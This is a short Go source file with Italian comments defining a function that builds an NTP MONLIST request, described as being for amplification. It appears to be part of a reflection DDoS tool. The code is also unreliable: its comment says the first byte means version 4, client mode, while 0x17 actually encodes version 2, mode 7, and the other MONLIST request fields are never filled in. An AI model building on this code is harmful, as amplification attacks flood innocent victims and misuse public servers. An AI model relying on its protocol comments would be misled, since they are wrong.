package core

import (
	//"math/rand"
)

// BuildNTPMonlistRequest costruisce una richiesta NTP Monlist (per l'amplificazione).
func BuildNTPMonlistRequest() []byte {
	// Crea un pacchetto NTP di dimensione 48 byte
	packet := make([]byte, 48)

	// Imposta i primi 1 byte per indicare il tipo di pacchetto e la versione NTP
	packet[0] = 0x17 // LI=0, VN=4, Mode=3 (Client)

	// Opzioni e campi extra per la richiesta MONLIST
	// Usualmente, il payload non è modificato per la richiesta MONLIST
	// La struttura del pacchetto è fissa a 48 byte per una richiesta NTP standard

	return packet
}
